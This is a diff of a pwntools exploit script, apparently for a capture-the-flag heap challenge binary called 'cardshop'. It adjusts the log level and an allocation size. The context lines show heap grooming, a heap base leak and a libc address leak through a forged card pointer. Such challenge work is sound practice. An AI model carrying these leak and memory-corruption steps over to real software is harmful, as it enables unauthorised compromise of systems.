@@ -33,7 +33,7 @@ e = ELF("./cardshop")
 libc = ELF("./libc.so.6")
 
 context.binary = e
-context.log_level = "info"
+context.log_level = "debug"
 
 
 is_local = False
@@ -107,7 +107,7 @@ def write64(addr, val):
 
 
 for i in range(0, 0xf):
-    new_card(0x900, "A" * 0x900)
+    new_card(0x900, "A" * 0x90)
 
 new_card(0x30, "A" * 0x30)
 delete_card(15)
@@ -121,6 +121,7 @@ new_card(0x10, "A" * 0x10)
 card_info(12)
 leak = (int(p.recvline().split()[-1]) << 12) - 0x8000
 info("heap base: " + hex(leak))
+
 new_card(0x10, p64(0x8) + p64(leak + 0x1528))
 read_card(12)
 libc_leak = p.recvline()
